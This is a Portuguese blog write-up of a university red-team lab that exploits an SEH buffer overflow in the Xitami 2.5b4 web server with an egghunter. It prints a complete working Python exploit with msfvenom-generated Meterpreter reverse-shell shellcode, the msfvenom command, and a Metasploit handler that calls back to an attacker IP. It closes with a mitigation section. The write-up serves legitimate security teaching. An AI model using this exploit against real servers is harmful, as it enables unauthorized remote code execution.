---
title: "Buffer Overflow no Xitami 2.5b4 (HTTP) com SEH Egghunter"
date: 2026-09-13 10:00:00 -0300
categories: [Writeups, FIAP]
tags: [windows, buffer-overflow, exploit-development, msfvenom, shellcode, seh, egghunter, http, xitami, meterpreter, reverse-shell]
---

Neste artigo técnico, detalho a resolução de laboratório da pós-graduação de Offensive Cyber Security - Red Team Ops da FIAP. Diferente do buffer overflow clássico, este desafio exigiu uma técnica adicional: como o espaço disponível após a corrupção do SEH (Structured Exception Handler) era pequeno demais para o shellcode completo, foi necessário utilizar um **egghunter** — um pequeno stub que varre a memória do processo em busca de uma tag específica, localizando e executando o payload real, que é enviado por um caminho separado (nesse caso, dentro do cabeçalho HTTP `User-Agent`).

## 1. Contextualização e Motivação

Vulnerabilidades de SEH-based buffer overflow exploram o mecanismo de tratamento de exceções do Windows: ao sobrescrever o registro de exceção estruturada, é possível redirecionar o fluxo de execução assim que uma exceção é disparada. A dificuldade nesse tipo de exploração costuma ser o espaço limitado disponível logo após o ponto de overflow, insuficiente para acomodar um shellcode completo. Por isso a necessidade da técnica de egghunter, que aloca uma pequena rotina de busca no espaço disponível, enquanto o payload real trafega por outro campo da requisição.

O alvo desse laboratório foi um serviço HTTP vulnerável (Xitami 2.5b4) hospedado na VM do laboratório. O escopo era identificar o serviço vulnerável, adaptar um exploit de referência, obter execução remota de código e extrair a evidência final.

## 2. Descoberta de Serviço Vulnerável

O reconhecimento inicial foi feito com Nmap na máquina alvo, identificando a porta 80 aberta com o serviço **Xitami** em execução.

![Varredura de portas e serviços](/assets/img/posts/xitami-buffer-overflow/varredura-portas.png)
_Varredura de portas e serviços disponíveis no servidor_

O Nmap identificou o serviço, mas não a versão exata. Pesquisando o padrão de resposta do servidor, confirmei se tratar da versão **2.5b4**, conhecida por ser vulnerável a um buffer overflow explorável via técnica de SEH Egghunter.

## 3. Pesquisa de Exploit na Base

Pesquisei na base do Exploit-DB e encontrei o script de código **EDB-ID 46797**, compatível com a versão identificada. Realizei o download para a máquina Kali Linux e adaptei o payload com os dados da minha máquina de ataque.

## 4. Alterações em Shellcode e Payload

### 4.1 Geração de Novo Shellcode

Gerei o shellcode com o msfvenom, utilizando um payload Meterpreter com conexão reversa e codificação alfanumérica (`x86/alpha_mixed`) — necessária porque o campo da requisição HTTP usado para transportar o payload real (o cabeçalho `User-Agent`) só aceita caracteres alfanuméricos:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.20.10.6 LPORT=4444 -f python -v shellcode -e x86/alpha_mixed
```

### 4.2 Estrutura do Egghunter e Payload de SEH

O script final combina duas partes que trafegam por caminhos diferentes na requisição HTTP:

- O **shellcode real** (Meterpreter, codificado em alfanumérico), precedido pela tag de 8 bytes `SOUF` e um pequeno sled de NOPs, é enviado no cabeçalho `User-Agent`.
- O **payload de corrupção do SEH** — preenchimento, egghunter, salto de NSEH e o endereço de sobrescrita do SEH (um gadget `pop/pop/ret` em `xiwin32.exe`, no endereço `0x00401d87`) — é enviado no cabeçalho `If-Modified-Since`.

Quando a exceção é disparada, o fluxo é desviado para o egghunter, que varre a memória em busca da tag `SOUF` e transfere a execução para o shellcode real, entregue separadamente via `User-Agent`.

```python
import socket
import sys
import struct

if len(sys.argv) != 2 :
	print "[+] Usage : python exploit.py [VICTIM_IP]"
	exit(0)

TCP_IP = sys.argv[1]
TCP_PORT = 80


egg = "SOUFSOUF"
nops = "\x90"*10

shellcode =  b""
shellcode += b"\xd9\xea\xd9\x74\x24\xf4\x5a\x4a\x4a\x4a\x4a"
shellcode += b"\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43"
shellcode += b"\x43\x43\x37\x52\x59\x6a\x41\x58\x50\x30\x41"
shellcode += b"\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
shellcode += b"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42"
shellcode += b"\x75\x4a\x49\x49\x6c\x58\x68\x6e\x70\x67\x70"
shellcode += b"\x73\x30\x73\x30\x31\x70\x64\x71\x6a\x72\x4c"
shellcode += b"\x49\x49\x75\x62\x44\x4e\x6b\x43\x62\x54\x70"
shellcode += b"\x6c\x4b\x46\x32\x66\x6c\x6e\x6b\x51\x42\x77"
shellcode += b"\x64\x6d\x6f\x6f\x6f\x6b\x4f\x70\x61\x66\x7a"
shellcode += b"\x6e\x6b\x63\x42\x36\x48\x76\x6f\x6c\x77\x50"
shellcode += b"\x4a\x34\x64\x50\x31\x79\x50\x4e\x4c\x55\x6c"
shellcode += b"\x73\x51\x43\x4c\x57\x72\x44\x6c\x75\x70\x4a"
shellcode += b"\x61\x7a\x6f\x54\x4d\x45\x51\x38\x47\x51\x59"
shellcode += b"\x34\x35\x7a\x4f\x43\x62\x6e\x6b\x30\x52\x44"
shellcode += b"\x50\x4e\x6b\x50\x42\x75\x6c\x56\x61\x6a\x70"
shellcode += b"\x46\x37\x4c\x4b\x43\x70\x44\x38\x6e\x65\x6f"
shellcode += b"\x30\x74\x34\x50\x4a\x45\x51\x6e\x30\x46\x30"
shellcode += b"\x6c\x4b\x42\x78\x37\x50\x6e\x6b\x47\x38\x75"
shellcode += b"\x48\x75\x51\x6b\x63\x6f\x75\x5a\x69\x62\x54"
shellcode += b"\x37\x4a\x33\x79\x6e\x6b\x46\x54\x4e\x6b\x4e"
shellcode += b"\x6b\x61\x6d\x69\x68\x46\x61\x4b\x66\x36\x51"
shellcode += b"\x39\x50\x6c\x6c\x5a\x61\x7a\x6f\x76\x6d\x76"
shellcode += b"\x61\x59\x57\x64\x78\x39\x70\x31\x65\x6c\x34"
shellcode += b"\x55\x6b\x63\x4d\x44\x64\x74\x35\x6b\x52\x71"
shellcode += b"\x48\x6e\x6b\x70\x58\x61\x34\x47\x71\x69\x43"
shellcode += b"\x70\x66\x4c\x4b\x54\x4c\x70\x4b\x6e\x6b\x52"
shellcode += b"\x78\x75\x4c\x37\x71\x6e\x33\x6c\x4b\x33\x34"
shellcode += b"\x6e\x6b\x35\x51\x5a\x70\x4d\x59\x50\x44\x34"
shellcode += b"\x64\x74\x64\x31\x4b\x71\x4b\x75\x31\x30\x59"
shellcode += b"\x70\x5a\x50\x51\x49\x6f\x59\x70\x66\x38\x61"
shellcode += b"\x4f\x53\x6a\x4c\x4b\x77\x62\x38\x69\x61\x6f"
shellcode += b"\x6b\x4f\x79\x6f\x39\x6f\x31\x4d\x52\x48\x37"
shellcode += b"\x43\x35\x62\x65\x50\x35\x50\x73\x58\x43\x47"
shellcode += b"\x33\x43\x76\x52\x53\x6f\x70\x54\x51\x78\x79"
shellcode += b"\x30\x4d\x55\x51\x4d\x74\x6f\x4f\x79\x5a\x48"
shellcode += b"\x59\x6f\x58\x50\x6d\x68\x4c\x50\x33\x31\x67"
shellcode += b"\x70\x33\x30\x64\x69\x79\x54\x66\x34\x42\x70"
shellcode += b"\x62\x48\x4f\x34\x4a\x77\x42\x6f\x75\x6b\x49"
shellcode += b"\x6f\x69\x45\x42\x4a\x57\x7a\x73\x58\x4c\x6c"
shellcode += b"\x55\x44\x45\x5a\x63\x36\x32\x48\x64\x42\x75"
shellcode += b"\x50\x76\x71\x73\x6c\x6b\x39\x4a\x46\x76\x30"
shellcode += b"\x56\x30\x52\x70\x72\x70\x53\x70\x70\x50\x63"
shellcode += b"\x70\x36\x30\x35\x38\x6d\x55\x32\x47\x58\x43"
shellcode += b"\x75\x4b\x69\x6f\x6b\x65\x6f\x67\x71\x7a\x44"
shellcode += b"\x50\x56\x36\x73\x67\x33\x58\x6d\x6e\x68\x73"
shellcode += b"\x31\x4e\x73\x7a\x4b\x4f\x58\x55\x4d\x55\x69"
shellcode += b"\x50\x62\x54\x67\x7a\x39\x6f\x42\x6e\x53\x38"
shellcode += b"\x61\x65\x6a\x4c\x49\x78\x33\x57\x65\x50\x35"
shellcode += b"\x50\x53\x30\x32\x4a\x55\x50\x73\x5a\x77\x74"
shellcode += b"\x30\x56\x42\x77\x55\x38\x6b\x4e\x50\x6b\x6e"
shellcode += b"\x4e\x72\x6b\x69\x6f\x79\x45\x6e\x63\x6a\x58"
shellcode += b"\x37\x70\x61\x6e\x74\x76\x4c\x4b\x35\x66\x33"
shellcode += b"\x5a\x57\x30\x70\x68\x73\x30\x76\x70\x33\x30"
shellcode += b"\x73\x30\x63\x66\x32\x4a\x63\x30\x31\x78\x4c"
shellcode += b"\x6c\x4d\x62\x6f\x7a\x56\x6d\x6b\x4f\x39\x45"
shellcode += b"\x6f\x63\x73\x63\x70\x6a\x47\x70\x32\x76\x66"
shellcode += b"\x33\x76\x37\x30\x68\x59\x6e\x50\x6b\x4c\x6e"
shellcode += b"\x72\x6b\x79\x6f\x4a\x75\x4c\x43\x78\x78\x77"
shellcode += b"\x70\x31\x6d\x55\x78\x62\x78\x30\x68\x73\x30"
shellcode += b"\x31\x50\x33\x30\x37\x70\x30\x6a\x63\x30\x50"
shellcode += b"\x50\x71\x78\x4c\x4e\x68\x4f\x64\x45\x72\x42"
shellcode += b"\x59\x6f\x6e\x35\x31\x47\x31\x78\x38\x63\x37"
shellcode += b"\x45\x45\x72\x4e\x6e\x6b\x4f\x5a\x75\x43\x6e"
shellcode += b"\x61\x4e\x39\x6f\x56\x6c\x36\x44\x56\x6f\x4d"
shellcode += b"\x55\x34\x30\x79\x6f\x6b\x4f\x49\x6f\x38\x69"
shellcode += b"\x4d\x4b\x4b\x4f\x49\x6f\x59\x6f\x57\x71\x59"
shellcode += b"\x53\x64\x69\x49\x56\x53\x45\x4b\x71\x5a\x63"
shellcode += b"\x6d\x6b\x42\x53\x43\x66\x6e\x79\x6d\x58\x32"
shellcode += b"\x4a\x33\x30\x46\x33\x4b\x4f\x69\x45\x41\x41"



egghunter ="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"+"SOUF"+"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

nseh_jmp = "\xeb\xaa"	#jmp back 84 bytes
seh = "\x87\x1d\x40"	# (xiwin32.exe) 0x00401d87 -> pop/pop/ret. ( Parial Overwrite )

payload = "A"*120
payload += egghunter
payload += "A"*(190-len(payload))
payload += nseh_jmp
payload += seh

http_req = "GET / HTTP/1.1\r\n"
http_req += "Host: "+ TCP_IP +"\r\n"
http_req += "User-Agent: "+egg+nops+shellcode+"\r\n"
http_req += "If-Modified-Since: Wed, " + payload + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
print "[+] Sending exploit payload..."
s.send(http_req)
s.close()
```

## 5. Pós-Exploração e Obtenção da Flag

Antes de executar o exploit, configurei um `multi/handler` no Metasploit para aguardar a conexão reversa do Meterpreter:

``` bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.20.10.6
set LPORT 4444
run
```

![Multi/handler configurado e aguardando conexão](/assets/img/posts/xitami-buffer-overflow/multihandler.png)
_Multi/handler configurado no Metasploit_

Executei o script contra o alvo, e a conexão reversa foi estabelecida com sucesso.

![Conexão reversa Meterpreter estabelecida com sucesso](/assets/img/posts/xitami-buffer-overflow/conexao-reversa.png)
_Sessão Meterpreter obtida após exploração_

Naveguei até o Desktop do usuário `Ciber` e localizei o arquivo de flag, cujo conteúdo estava em Base64. Após decodificar, obtive a evidência solicitada.

## 6. Visão Executiva e Análise de Riscos

Essa vulnerabilidade representa um risco crítico: o serviço explorado é um servidor HTTP, tipicamente exposto para acesso externo, o que amplia significativamente a superfície de ataque em comparação a serviços internos. Um invasor com acesso à porta 80 do servidor conseguiu, sem qualquer autenticação, obter execução remota de código e acesso interativo à máquina.

A causa raiz é a mesma da maioria dessas falhas: uso de software legado (Xitami 2.5b4) sem suporte ou atualizações de segurança, incapaz de validar corretamente o tamanho dos dados recebidos em requisições HTTP. A recomendação de mitigação segue a linha de descontinuar serviços legados sem suporte ativo do fabricante, substituindo-os por soluções mantidas e atualizadas, além de reforçar a segmentação de rede e o monitoramento de tráfego HTTP anômalo em serviços expostos externamente.